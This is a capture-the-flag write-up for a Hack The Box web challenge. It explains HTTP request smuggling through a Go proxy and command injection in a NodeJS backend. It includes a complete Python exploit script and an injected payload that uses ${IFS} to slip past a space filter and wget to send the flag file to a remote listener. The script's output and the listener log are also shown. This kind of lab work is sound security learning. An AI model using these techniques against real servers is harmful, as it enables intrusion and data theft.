# [Web - medium] HTB Proxy

We are presented with a web application that contains:
- a NodeJS backend, that has the capability to give IP addresses of its server and flush a given network interface
- a Golang frontend, used as a proxy. It is used to filter out invalid requests and can serve directly server information, such as the IP address of the docker container running it

The end goal is to run an arbitrary command that will send back the content of the random flag file created at the root of the container. Analysing the NodeJS application, it makes use of the [ip-wrapper](https://www.npmjs.com/package/ip-wrapper/v/1.0.0?activeTab=code) library, which runs dangerous `exec` when flushing interface, the interface being a parameter of a shell command.

The backend app validates the interface name given as input if:
- it is a string
- it doesn't contain blank spaces
- is not empty

The proxy also filters few things:
- it checks the host header of the HTTP request. If the host is a domain that resolves in a local address from a blacklist, it will discard it
- it checks if a body is "malicious" following few regex (e.g. if it contains bash characters like semicolon), and discards it if matched
The proxy is based on the `Content-Length` header , so we can lie about our request to smuggle another one that will be understood by the backend. This is HTTP request smuggling.

The first thing to bypass being the local domain name, we leverage the `/server-status` endpoint

```bash
$ curl 94.237.50.128:43240/server-status
Hostname: ng-team-54932-webhtbproxybiz2024-vnkh8-6b45d85bd9-xz55m, Operating System: linux, Architecture: amd64, CPU Count: 4, Go Version: go1.21.10, IPs: 192.168.41.159
```

This gives access to the backend without using an IP within `127.0.0.1`. We also need a domain for it, hence I created

```bash
$ dig +short htb1.gaulon.org
192.168.41.159
```

For the request smuggling to bypass the different checks of the proxy, I created a python script. It uses the DNS record created earlier to bypass the Host header check. The final payload makes use of `${IFS}` to use the Internal Field Separator instead of spaces which would be rejected. Finally the script smuggles a POST `/flushInterface` sending a JSON payload giving a shell command as interface name, within a POST `/getAddresses`

```python
import socket

private_host = "htb1.gaulon.org:5000"
# resolves in same IP as
# $ curl 94.237.50.128:43240/server-status
# Hostname: ng-team-54932-webhtbproxybiz2024-vx9em-7fcb98754-pztzj, Operating System: linux, Architecture: amd64, CPU Count: 4, Go Version: go1.21.10, IPs: 192.168.41.159

payload = '{"interface":"lo;wget${IFS}http://1.2.3.4:4444/$(cat${IFS}/flag*.txt)"}'

smuggled = "POST /flushInterface HTTP/1.1\r\n"
smuggled += "Host: 127.0.0.1\r\n"
smuggled += "Content-Type: application/json\r\n"
smuggled += "Content-Length: {}\r\n\r\n{}".format(len(payload), payload)

smuggler = "POST /getAddresses HTTP/1.1\r\n"
smuggler += "Host: {}\r\n".format(private_host)
smuggler += "Content-Type: application/x-www-form-urlencoded\r\n"
smuggler += "Content-Length: {}\r\n\r\n{}".format(1, "a")
smuggler += "\r\n\r\n{}".format(smuggled)

print("SEND:")
print(smuggler)
msg = smuggler.encode("ascii")
print("RAW:")
print(msg)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(('94.237.50.128', 43240))
    s.sendall(msg)
    response = s.recv(1024).decode("ascii")
    print("RECEIVED:")
    print(response)
    response = s.recv(1024).decode("ascii")
    print("RECEIVED:")
    print(response)
```

The payload starts a subshell to cat the content of a file and sends it to a remote server via wget. Running the script gives

```bash
$ python exploit.py
SEND:
POST /getAddresses HTTP/1.1
Host: htb1.gaulon.org:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 1

a

POST /flushInterface HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 71

{"interface":"lo;wget${IFS}http://1.2.3.4:4444/$(cat${IFS}/flag*.txt)"}
RAW:
b'POST /getAddresses HTTP/1.1\r\nHost: htb1.gaulon.org:5000\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1\r\n\r\na\r\n\r\nPOST /flushInterface HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 71\r\n\r\n{"interface":"lo;wget${IFS}http://1.2.3.4:4444/$(cat${IFS}/flag*.txt)"}'
RECEIVED:
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 37
ETag: W/"25-+Jf7C2mDx/nvPFRCWncafprqHNs"
Date: Sun, 19 May 2024 16:00:42 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"message":"Error getting addresses"}HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 38
ETag: W/"26-1CQv+OK4Js7XnYldCbe/Ju97dzY"
Date: Sun, 19 May 2024 16:00:43 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"message":"Error flushing interface"}

RECEIVED:
```

And we receive the flag on the remote server

```bash
pi@raspberrypi:/tmp/lol $ python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
94.237.50.128 - - [19/May/2024 17:00:43] "GET /HTB{r3inv3nting_th3_wh331_c4n_cr34t3_h34dach35_998ac1dad32dab818b49b4e9e1050b25} HTTP/1.1" 404 -
```